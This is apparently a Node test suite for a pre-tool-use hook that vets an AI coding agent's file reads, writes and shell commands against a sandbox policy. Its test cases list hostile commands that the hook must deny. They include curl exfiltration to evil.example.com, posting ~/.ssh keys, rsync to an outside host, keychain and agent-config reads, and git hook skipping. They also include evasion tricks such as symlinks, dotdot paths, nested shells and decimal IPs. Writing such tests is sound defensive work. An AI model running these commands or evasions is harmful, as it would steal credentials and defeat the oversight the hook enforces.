import { strict as assert } from "node:assert";
import { cpSync, mkdirSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { join } from "node:path";
import { after, test } from "node:test";
import { antigravityPreTool } from "../adapter.mjs";
import { loadAntigravityPolicy, tossHostFromRules } from "../policy.mjs";
import {
  createFixture,
  projectFor,
  repoRoot,
} from "../../claude-hooks/tests/fixture.mjs";
import { LOCK } from "../../../.claude/hooks/lib/project.mjs";

const f = createFixture();
const fakeHome = join(f.base, "fake-home");
mkdirSync(join(fakeHome, ".ssh"), { recursive: true });
mkdirSync(join(fakeHome, ".claude", "projects"), { recursive: true });
mkdirSync(join(fakeHome, ".codex"), { recursive: true });
mkdirSync(join(fakeHome, ".gemini"), { recursive: true });
mkdirSync(join(fakeHome, "Library", "Keychains"), { recursive: true });
mkdirSync(join(fakeHome, "notes"), { recursive: true });
writeFileSync(join(fakeHome, ".ssh", "id_probe"), "secret\n");
writeFileSync(join(fakeHome, ".claude", "settings.json"), "{}\n");
writeFileSync(join(fakeHome, ".codex", "config.toml"), "x = 1\n");
writeFileSync(join(fakeHome, ".gemini", "settings.json"), "{}\n");
writeFileSync(join(fakeHome, ".zsh_history"), "echo hi\n");
writeFileSync(join(fakeHome, "notes", "MEMORY.md"), "memory\n");
symlinkSync(join(fakeHome, ".ssh"), join(f.worktree, "docs", "ssh-link"));
symlinkSync(
  join(fakeHome, ".gemini", "missing-probe"),
  join(f.worktree, "docs", "dangling-gemini-link"),
);
symlinkSync(
  join(f.worktree, "justfile"),
  join(f.worktree, "docs", "justfile-link"),
);

mkdirSync(join(f.root, "harness", "sandbox"), { recursive: true });
mkdirSync(join(f.root, "harness", "arch-check"), { recursive: true });
cpSync(
  join(repoRoot, "harness/sandbox/policy.json"),
  join(f.root, "harness/sandbox/policy.json"),
);
cpSync(
  join(repoRoot, "harness/arch-check/rules.toml"),
  join(f.root, "harness/arch-check/rules.toml"),
);

after(() => rmSync(f.base, { recursive: true, force: true }));

const call = (toolName, args, opts = {}) => {
  const {
    lock = LOCK.on,
    cwd = f.worktree,
    sessionCwd = f.worktree,
    modelName = "gemini-4-neon-xhigh",
    agentType = undefined,
    projectOverrides = {},
    policyOverrides = undefined,
  } = opts;
  const branch = Object.hasOwn(opts, "branch") ? opts.branch : "h-61";
  const project = projectFor(f, { lock, ...projectOverrides });
  return antigravityPreTool(
    {
      hookEventName: "PreToolUse",
      cwd,
      modelName,
      ...(agentType === undefined ? {} : { agent_type: agentType }),
      toolCall: { id: "tc-1", name: toolName, args },
    },
    project,
    sessionCwd,
    {
      home: fakeHome,
      branch,
      ...(policyOverrides === undefined ? {} : { policy: policyOverrides }),
    },
  );
};

test("Antigravity pre-tool enforces the allow and deny matrix across all four scopes", () => {
  const cases = [
    [
      "write_file",
      { Path: join(f.worktree, "crates/domain/src/lib.rs"), Content: "x" },
      {},
      "allow",
    ],
    [
      "edit_file",
      {
        Path: join(f.worktree, "docs/notes.md"),
        Target: "a",
        Replacement: "b",
      },
      {},
      "allow",
    ],
    [
      "write_file",
      { Path: join(f.worktree, "justfile"), Content: "x" },
      { lock: LOCK.on },
      "deny",
    ],
    [
      "write_file",
      { Path: join(f.worktree, "docs/harness.md"), Content: "x" },
      { lock: LOCK.on },
      "deny",
    ],
    [
      "write_file",
      { Path: join(f.worktree, ".agents/hooks.json"), Content: "{}" },
      { lock: LOCK.off },
      "deny",
    ],
    [
      "write_file",
      { Path: join(f.worktree, ".claude/settings.local.json"), Content: "{}" },
      { lock: LOCK.off },
      "deny",
    ],
    [
      "write_file",
      { Path: join(f.worktree, ".cargo/config.toml"), Content: "x" },
      { lock: LOCK.off },
      "deny",
    ],
    [
      "write_file",
      { Path: join(f.worktree, "docs/progress.md"), Content: "x" },
      { lock: LOCK.off },
      "deny",
    ],
    [
      "write_file",
      { Path: join(f.worktree, "docs/tasks.md"), Content: "x" },
      { lock: LOCK.off },
      "deny",
    ],
    [
      "write_file",
      { Path: join(f.worktree, "docs/reviews/H-61.md"), Content: "x" },
      { lock: LOCK.off },
      "allow",
    ],
    [
      "write_file",
      { Path: join(f.worktree, "docs/reviews/H-61.md"), Content: "x" },
      { lock: LOCK.on },
      "deny",
    ],
    [
      "write_file",
      { Path: join(f.worktree, "docs/GEMINI.md"), Content: "x" },
      { lock: LOCK.off },
      "deny",
    ],
    [
      "write_file",
      { Path: join(f.worktree, "crates/.agents/hooks.json"), Content: "{}" },
      { lock: LOCK.off },
      "deny",
    ],
    ["read_file", { Path: join(f.worktree, "docs/notes.md") }, {}, "allow"],
    ["read_file", { Path: join(fakeHome, ".ssh/id_probe") }, {}, "deny"],
    [
      "read_file",
      { Path: join(fakeHome, ".claude/settings.json") },
      {},
      "deny",
    ],
    ["read_file", { Path: join(fakeHome, ".codex/config.toml") }, {}, "deny"],
    [
      "read_file",
      { Path: join(fakeHome, ".gemini/settings.json") },
      {},
      "deny",
    ],
    ["read_file", { Path: join(fakeHome, ".zsh_history") }, {}, "deny"],
    [
      "read_file",
      { Path: join(fakeHome, "Library/Keychains/login.keychain-db") },
      {},
      "deny",
    ],
    ["read_file", { Path: join(fakeHome, "notes/MEMORY.md") }, {}, "deny"],
    ["read_file", { Path: fakeHome }, {}, "deny"],
    ["read_file", { Path: "~/.ssh/id_probe" }, {}, "deny"],
    ["read_file", { Path: "$HOME/.claude/settings.json" }, {}, "deny"],
    ["read_file", { Path: "~root/.ssh/id_rsa" }, {}, "deny"],
    [
      "edit_file",
      {
        Path: join(f.worktree, "docs/notes.md"),
        Target: "a",
        Replacement: "b",
      },
      { modelName: "gemini-4-neon-high" },
      "deny",
    ],
    [
      "write_file",
      { Path: join(f.worktree, "crates/domain/src/lib.rs"), Content: "x" },
      { branch: undefined },
      "deny",
    ],
    [
      "write_file",
      { Path: join(f.worktree, "crates/domain/src/lib.rs"), Content: "x" },
      { branch: "master" },
      "deny",
    ],
    [
      "write_file",
      { Path: join(f.worktree, "crates/domain/src/lib.rs"), Content: "x" },
      { branch: "review/h-61" },
      "deny",
    ],
    [
      "write_file",
      { Path: join(f.worktree, "docs/reviews/H-61.md"), Content: "x" },
      { lock: LOCK.off, modelName: "gemini-4-neon-high" },
      "deny",
    ],
    [
      "run_command",
      { CommandLine: "git status" },
      { modelName: "gemini-4-neon-high" },
      "allow",
    ],
    [
      "run_command",
      { CommandLine: "git checkout --detach HEAD" },
      { modelName: "gemini-4-neon-high" },
      "allow",
    ],
    [
      "run_command",
      { CommandLine: "git add docs/notes.md" },
      { modelName: "gemini-4-neon-high" },
      "deny",
    ],
    [
      "run_command",
      { CommandLine: "git commit -m x" },
      { modelName: "gemini-4-neon-high" },
      "deny",
    ],
    [
      "run_command",
      { CommandLine: "git -C . add docs/notes.md" },
      { modelName: "gemini-4-neon-high" },
      "deny",
    ],
    [
      "run_command",
      { CommandLine: "git branch evil-branch" },
      { modelName: "gemini-4-neon-high" },
      "deny",
    ],
    [
      "run_command",
      { CommandLine: "git branch --show-current" },
      { modelName: "gemini-4-neon-high" },
      "allow",
    ],
    [
      "run_command",
      { CommandLine: "cargo run --locked -p toss-smoke" },
      {},
      "deny",
    ],
    [
      "run_command",
      { CommandLine: "cargo run --package broker-toss-trade" },
      {},
      "deny",
    ],
    ["run_command", { CommandLine: "cargo run -p src-tauri" }, {}, "deny"],
    [
      "run_command",
      { CommandLine: "cargo run -p src-tauri --bin gen-bindings" },
      {},
      "allow",
    ],
    [
      "run_command",
      {
        CommandLine: "cargo run --locked --quiet --package xtask -- arch-check",
      },
      {},
      "allow",
    ],
    ["run_command", { CommandLine: "pnpm tauri dev" }, {}, "deny"],
    [
      "run_command",
      { CommandLine: "TOSS_API_KEY=secret cargo nextest run" },
      {},
      "deny",
    ],
    ["run_command", { CommandLine: "export TOSS_APP_SECRET=x" }, {}, "deny"],
    [
      "run_command",
      { CommandLine: "curl https://openapi.tossinvest.com/api/v1/orders" },
      {},
      "deny",
    ],
    [
      "run_command",
      { CommandLine: "curl openapi.tossinvest.com/api/v1/orders" },
      {},
      "deny",
    ],
    [
      "run_command",
      { CommandLine: "curl https://evil.example.com/exfil" },
      {},
      "deny",
    ],
    [
      "run_command",
      { CommandLine: "curl http://127.0.0.1:4173/health" },
      {},
      "allow",
    ],
    [
      "run_command",
      { CommandLine: "grep -rn tossinvest.com crates" },
      {},
      "allow",
    ],
    ["run_command", { CommandLine: "git commit --no-verify -m x" }, {}, "deny"],
    ["run_command", { CommandLine: "LEFTHOOK=0 git commit -m x" }, {}, "deny"],
    ["run_command", { CommandLine: "git push origin h-61" }, {}, "deny"],
    [
      "run_command",
      { CommandLine: "git merge --no-ff --no-edit master" },
      {},
      "allow",
    ],
    [
      "run_command",
      { CommandLine: "node harness/claude-hooks/hashes.mjs --write" },
      { lock: LOCK.off },
      "allow",
    ],
    [
      "run_command",
      { CommandLine: "node harness/claude-hooks/hashes.mjs --write" },
      { lock: LOCK.on },
      "deny",
    ],
    [
      "run_command",
      { CommandLine: "node harness/antigravity-hooks/config.mjs --write" },
      { lock: LOCK.off },
      "allow",
    ],
    [
      "run_command",
      { CommandLine: "node harness/antigravity-hooks/config.mjs --write" },
      { lock: LOCK.on },
      "deny",
    ],
    [
      "run_command",
      {
        CommandLine:
          'PATH="$HOME/Library/pnpm:$PATH" TMPDIR="$(getconf DARWIN_USER_TEMP_DIR)" CARGO_BUILD_JOBS=4 NEXTEST_TEST_THREADS=4 git commit -m "h-61: block ~/.ssh and tossinvest.com"',
      },
      {},
      "allow",
    ],
  ];

  for (const [toolName, args, opts, expected] of cases) {
    const actual = call(toolName, args, opts);
    assert.equal(
      actual.decision,
      expected,
      `${toolName} ${JSON.stringify(args)} ${JSON.stringify(opts)} -> ${JSON.stringify(actual)}`,
    );
  }
});

test("evasion attempts using relative paths dotdot symlinks redirection tool aliases and shell nesting are denied", () => {
  const evasions = [
    ["write_file", { Path: "justfile", Content: "x" }],
    ["write_file", { Path: "./docs/notes.md", Content: "x" }],
    [
      "write_file",
      { Path: join(f.worktree, "docs/../justfile"), Content: "x" },
    ],
    [
      "write_file",
      { Path: join(f.worktree, "docs/justfile-link"), Content: "x" },
    ],
    ["write_file", { Path: join(f.root, "docs/notes.md"), Content: "x" }],
    ["write_file", { Path: "~/.gemini/settings.json", Content: "{}" }],
    [
      "write_to_file",
      { TargetFile: join(f.worktree, "justfile"), Content: "x" },
    ],
    [
      "replace_file_content",
      { TargetFile: join(f.worktree, ".agents/hooks.json") },
    ],
    [
      "multi_replace_file_content",
      { TargetFile: join(f.worktree, "docs/progress.md") },
    ],
    ["Write", { file_path: join(f.worktree, "justfile") }],
    ["Edit", { file_path: join(f.worktree, "justfile") }],
    ["NotebookEdit", { notebook_path: join(f.worktree, "justfile") }],
    ["read_file", { Path: join(f.worktree, "docs/ssh-link/id_probe") }],
    ["read_file", { Path: join(f.worktree, "docs/dangling-gemini-link") }],
    ["read_file", { Path: "../fake-home/.ssh/id_probe" }],
    ["read_file", { Path: "docs/../../fake-home/.ssh/id_probe" }],
    ["view_file", { AbsolutePath: join(fakeHome, ".claude/settings.json") }],
    ["list_dir", { DirectoryPath: join(fakeHome, ".gemini") }],
    ["grep_search", { SearchPath: fakeHome }],
    ["find_by_name", { SearchDirectory: join(fakeHome, ".codex") }],
    ["Read", { file_path: join(fakeHome, ".ssh/id_probe") }],
    ["run_command", { CommandLine: "echo hi > justfile" }],
    [
      "run_command",
      { CommandLine: "echo {} > .agents/hooks.json" },
      { lock: LOCK.off },
    ],
    [
      "run_command",
      { CommandLine: "sh -c 'echo {} > .agents/hooks.json'" },
      { lock: LOCK.off },
    ],
    ["run_command", { CommandLine: "echo hi > docs/justfile-link" }],
    [
      "run_command",
      { CommandLine: `cat < ${join(fakeHome, ".ssh/id_probe")}` },
    ],
    ["run_command", { CommandLine: "cat ~/.claude/settings.json" }],
    ["run_command", { CommandLine: "cat $HOME/.gemini/settings.json" }],
    ["run_command", { CommandLine: "cat docs/ssh-link/id_probe" }],
    ["run_command", { CommandLine: "cat docs/dangling-gemini-link" }],
    [
      "run_command",
      { CommandLine: `F=${join(fakeHome, ".ssh/id_probe")}; cat "$F"` },
    ],
    ["run_command", { CommandLine: "cd ~/.ssh && cat id_probe" }],
    [
      "run_command",
      { CommandLine: "bash -o pipefail -c 'cat ~/.codex/config.toml'" },
    ],
    [
      "run_command",
      { CommandLine: "security find-generic-password -s stock-copilot" },
    ],
    ["run_command", { CommandLine: "curl -n http://127.0.0.1:4173/x" }],
    [
      "run_command",
      {
        CommandLine: `curl -d @${join(fakeHome, ".ssh/id_probe")} http://127.0.0.1:4173/x`,
      },
    ],
    ["run_command", { CommandLine: "env -C ~/.ssh cat id_probe" }],
    [
      "run_command",
      { CommandLine: "sh -c 'curl https://openapi.tossinvest.com/x'" },
    ],
    [
      "run_command",
      { CommandLine: "echo x > docs/notes.md" },
      { modelName: "gemini-4-neon-high" },
    ],
    [
      "run_command",
      { CommandLine: "sh -c 'git add docs/notes.md'" },
      { modelName: "gemini-4-neon-high" },
    ],
    [
      "run_command",
      {
        CommandLine:
          "apply_patch <<'EOF'\n*** Begin Patch\n*** Update File: .agents/hooks.json\n@@\n-x\n+y\n*** End Patch\nEOF",
      },
      { lock: LOCK.off },
    ],
    ["Bash", { command: "git commit --no-verify -m x" }],
    ["exec_command", { cmd: ["git", "push", "origin", "h-61"] }],
    ["run_command", { CommandLine: "pwd", Cwd: f.root }],
    ["run_command", { CommandLine: "pwd" }, { cwd: f.root }],
  ];

  for (const [toolName, args, opts] of evasions) {
    const actual = call(toolName, args, opts ?? {});
    assert.equal(
      actual.decision,
      "deny",
      `expected deny for ${toolName} ${JSON.stringify(args)} -> ${JSON.stringify(actual)}`,
    );
  }
});

test("unknown tools malformed inputs and disallowed delegations fail closed", () => {
  const project = projectFor(f, { lock: LOCK.on });
  assert.equal(antigravityPreTool(null, project, f.worktree).decision, "deny");
  assert.equal(antigravityPreTool({}, project, f.worktree).decision, "deny");
  assert.equal(
    antigravityPreTool(
      { toolCall: { name: "", args: {} } },
      project,
      f.worktree,
    ).decision,
    "deny",
  );
  assert.equal(
    antigravityPreTool(
      { toolCall: { name: "read_file", args: "bad" } },
      project,
      f.worktree,
    ).decision,
    "deny",
  );
  assert.equal(
    antigravityPreTool(
      {
        toolCall: {
          name: "read_file",
          args: { Path: join(f.worktree, "docs/notes.md") },
        },
      },
      project,
      "/tmp",
    ).decision,
    "deny",
  );
  assert.equal(call("unknown_tool", {}).decision, "deny");
  assert.equal(call("invoke_subagent", { TypeName: "self" }).decision, "deny");
  assert.equal(call("run_workflow", { Script: "x" }).decision, "deny");
  assert.equal(call("swarm", { action: "add" }).decision, "deny");
  assert.equal(call("mcp_t3-code_pull_request_merge", {}).decision, "deny");
  assert.equal(
    call("manage_task", { Action: "send_input", TaskId: "1", Input: "x" })
      .decision,
    "deny",
  );
  assert.equal(call("manage_task", { Action: "list" }).decision, "allow");

  const validClaudeReview = {
    task: "review H-61",
    toolSummary: "Adversarial review",
    role: "review",
    isolation: "worktree",
    target: {
      driverKind: "claudeAgent",
      providerInstanceId: "claudeAgent",
      model: "claude-opus-5-5",
      options: { effort: "high" },
    },
  };
  assert.equal(
    call("mcp_t3-code_delegate_task", validClaudeReview).decision,
    "allow",
  );
  assert.equal(
    call("mcp_t3-code_delegate_task", {
      ...validClaudeReview,
      target: {
        driverKind: "claudeAgent",
        providerInstanceId: "claudeAgent_claude2",
        model: "claude-opus-5-5",
      },
    }).decision,
    "allow",
  );
  assert.equal(
    call("mcp_t3-code_delegate_task", {
      ...validClaudeReview,
      target: {
        driverKind: "claudeAgent",
        model: "claude-opus-5-5",
      },
    }).decision,
    "allow",
  );
  assert.equal(
    call("mcp_t3-code_delegate_task", validClaudeReview, {
      modelName: "gemini-4-neon-high",
    }).decision,
    "deny",
  );
  assert.equal(
    call("mcp_t3-code_delegate_task", {
      ...validClaudeReview,
      target: {
        driverKind: "codex",
        model: "gpt-6.1-sol",
        options: { reasoningEffort: "high" },
      },
    }).decision,
    "deny",
  );
  assert.equal(
    call("mcp_t3-code_delegate_task", {
      ...validClaudeReview,
      target: {
        driverKind: "claudeAgent",
        providerInstanceId: "codex",
        model: "claude-opus-5-5",
      },
    }).decision,
    "deny",
  );
  assert.equal(
    call("mcp_t3-code_delegate_task", {
      ...validClaudeReview,
      target: {
        driverKind: "claudeAgent",
        providerInstanceId: "",
        model: "claude-opus-5-5",
      },
    }).decision,
    "deny",
  );
  assert.equal(
    call("mcp_t3-code_delegate_task", {
      ...validClaudeReview,
      target: {
        driverKind: "claudeAgent",
        providerInstanceId: "claudeAgent",
        model: "claude-sonnet-5-5",
      },
    }).decision,
    "deny",
  );
  assert.equal(
    call("mcp_t3-code_delegate_task", {
      ...validClaudeReview,
      isolation: "shared",
    }).decision,
    "deny",
  );
  assert.equal(
    call("mcp_t3-code_delegate_task", {
      task: "critique H-61",
      toolSummary: "Critique review",
      role: "review",
      isolation: "worktree",
      target: {
        driverKind: "antigravity",
        providerInstanceId: "antigravity",
        model: "gemini-4-neon",
        options: { thought_level: "high" },
      },
    }).decision,
    "allow",
  );
});

test("single policy source changes propagate directly into Antigravity verdicts", () => {
  const project = projectFor(f, { lock: LOCK.on });
  const loaded = loadAntigravityPolicy(f.root, project);
  assert.ok(loaded.denyRead.includes("~/.ssh"));
  assert.ok(loaded.denyRead.includes("~/.codex/**"));
  assert.ok(loaded.denyRead.includes("~/.gemini"));
  assert.equal(loaded.tossHost, "tossinvest.com");
  const brokenRulesRoot = join(f.base, "broken-rules");
  mkdirSync(join(brokenRulesRoot, "harness", "arch-check"), {
    recursive: true,
  });
  writeFileSync(
    join(brokenRulesRoot, "harness", "arch-check", "rules.toml"),
    '[source.toss-host]\nneedle = "   "\n',
  );
  assert.throws(() => tossHostFromRules(brokenRulesRoot));

  const tossCurl = call("run_command", {
    CommandLine: "curl https://openapi.tossinvest.com/api/v1/orders",
  });
  assert.equal(tossCurl.decision, "deny");
  assert.match(tossCurl.reason, /네트워크 도구\(curl\)로 토스 운영 호스트/u);

  const tossInAllowed = {
    ...loaded,
    allowedDomains: ["tossinvest.com"],
  };
  assert.equal(
    call(
      "run_command",
      { CommandLine: "curl https://openapi.tossinvest.com/api/v1/orders" },
      { policyOverrides: tossInAllowed },
    ).decision,
    "deny",
  );
  assert.equal(
    call(
      "read_file",
      { Path: join(f.worktree, "docs/notes.md") },
      { branch: undefined },
    ).decision,
    "allow",
  );
  const detachedWrite = call(
    "write_file",
    { Path: join(f.worktree, "crates/domain/src/lib.rs"), Content: "x" },
    { branch: undefined },
  );
  assert.equal(detachedWrite.decision, "deny");
  assert.match(detachedWrite.reason, /role-without-edits/u);

  const customPolicy = {
    ...loaded,
    denyRead: ["~/.custom-secret"],
    allowedDomains: ["allowed.example.test"],
    tossHost: "custom-broker.example",
  };
  assert.equal(
    call(
      "read_file",
      { Path: join(fakeHome, ".custom-secret/token") },
      { policyOverrides: customPolicy },
    ).decision,
    "deny",
  );
  assert.equal(
    call(
      "run_command",
      { CommandLine: "curl https://allowed.example.test/pkg" },
      { policyOverrides: customPolicy },
    ).decision,
    "allow",
  );
  assert.equal(
    call(
      "run_command",
      { CommandLine: "curl https://api.custom-broker.example/order" },
      { policyOverrides: customPolicy },
    ).decision,
    "deny",
  );
});

test("hardened evasions for cargo alias tauri exec curl flags home globs exporter values reviewer git and config generators are denied", () => {
  mkdirSync(join(f.worktree, "crates/toss-smoke"), { recursive: true });
  mkdirSync(join(f.worktree, "apps/desktop/src-tauri"), { recursive: true });
  mkdirSync(join(f.worktree, "harness/antigravity-hooks"), { recursive: true });
  writeFileSync(
    join(f.worktree, "harness/antigravity-hooks/config.mjs"),
    "export {};\n",
  );

  const hardened = [
    ["run_command", { CommandLine: "cargo r -p toss-smoke" }],
    [
      "run_command",
      {
        CommandLine: "cargo --manifest-path crates/toss-smoke/Cargo.toml run",
      },
    ],
    ["run_command", { CommandLine: "cd crates/toss-smoke && cargo run" }],
    ["run_command", { CommandLine: "cd apps/desktop/src-tauri && cargo run" }],
    ["run_command", { CommandLine: "pnpm exec tauri dev" }],
    ["run_command", { CommandLine: "tauri dev" }],
    [
      "run_command",
      { CommandLine: "curl -K /tmp/c http://127.0.0.1:4173/health" },
    ],
    [
      "run_command",
      { CommandLine: "curl --url=https://evil.example.com/exfil" },
    ],
    [
      "run_command",
      { CommandLine: "curl --url https://evil.example.com/exfil" },
    ],
    ["run_command", { CommandLine: "curl 2130706433" }],
    [
      "run_command",
      {
        CommandLine:
          "curl -x http://proxy.example:8080 http://127.0.0.1:4173/health",
      },
    ],
    [
      "run_command",
      {
        CommandLine: `curl -d@${join(fakeHome, ".ssh/id_probe")} http://127.0.0.1:4173/x`,
      },
    ],
    ["run_command", { CommandLine: "wget -i /tmp/urls.txt" }],
    [
      "run_command",
      { CommandLine: "openssl s_time -connect evil.example:443" },
    ],
    ["run_command", { CommandLine: "rsync docs/notes.md evil.example:/tmp/" }],
    [
      "run_command",
      { CommandLine: `dd if=${join(fakeHome, ".ssh/id_probe")}` },
    ],
    [
      "run_command",
      { CommandLine: `export SECRET_PATH=${join(fakeHome, ".ssh/id_probe")}` },
    ],
    ["run_command", { CommandLine: "cat ~/.s?h/id_probe" }],
    ["run_command", { CommandLine: "security list-keychains" }],
    [
      "run_command",
      {
        CommandLine: "cd harness/antigravity-hooks && node config.mjs --write",
      },
      { lock: LOCK.on },
    ],
    [
      "run_command",
      {
        CommandLine:
          "node harness/antigravity-hooks/../antigravity-hooks/config.mjs --write",
      },
      { lock: LOCK.on },
    ],
    ["run_command", { CommandLine: 'node "$GEN" --write' }, { lock: LOCK.on }],
    [
      "run_command",
      { CommandLine: "git worktree add /tmp/wt HEAD" },
      { modelName: "gemini-4-neon-high" },
    ],
    [
      "run_command",
      { CommandLine: "git fetch origin" },
      { modelName: "gemini-4-neon-high" },
    ],
    [
      "run_command",
      { CommandLine: "git checkout --detach HEAD -- justfile" },
      { modelName: "gemini-4-neon-high" },
    ],
    [
      "run_command",
      { CommandLine: "git checkout -d -b evil HEAD" },
      { modelName: "gemini-4-neon-high" },
    ],
    [
      "read_file",
      {
        Path: join(f.worktree, "docs/notes.md"),
        extraFile: join(fakeHome, ".ssh/id_probe"),
      },
    ],
  ];

  for (const [toolName, args, opts] of hardened) {
    const actual = call(toolName, args, opts ?? {});
    assert.equal(
      actual.decision,
      "deny",
      `expected deny for ${toolName} ${JSON.stringify(args)} -> ${JSON.stringify(actual)}`,
    );
  }

  assert.equal(
    call(
      "run_command",
      { CommandLine: 'node scripts/probe.mjs "$ARG"' },
      { lock: LOCK.on },
    ).decision,
    "allow",
  );
  assert.equal(
    call("run_command", {
      CommandLine: "curl --url http://127.0.0.1:4173/health",
    }).decision,
    "allow",
  );
});

test("lastUserInput conversation text with forbidden strings does not block benign tool calls", () => {
  const project = projectFor(f, { lock: LOCK.on });
  const noisyUserInput = [
    "~/.ssh/id_rsa",
    "~/.gemini/settings.json",
    "TOSS_API_KEY=secret",
    "https://openapi.tossinvest.com/api/v1/orders",
    "git push --force origin master",
    "LEFTHOOK=0 git commit --no-verify",
    ".agents/hooks.json",
  ].join("\n");
  for (const [name, args] of [
    ["read_file", { Path: join(f.worktree, "docs/notes.md") }],
    [
      "write_file",
      { Path: join(f.worktree, "crates/domain/src/lib.rs"), Content: "x" },
    ],
    ["run_command", { CommandLine: "git status" }],
  ]) {
    const actual = antigravityPreTool(
      {
        hookEventName: "PreToolUse",
        cwd: f.worktree,
        modelName: "gemini-4-neon-xhigh",
        lastUserInput: noisyUserInput,
        toolCall: { id: "tc-noise", name, args },
      },
      project,
      f.worktree,
      { home: fakeHome, branch: "h-61" },
    );
    assert.equal(
      actual.decision,
      "allow",
      `${name} should ignore lastUserInput: ${JSON.stringify(actual)}`,
    );
  }
});
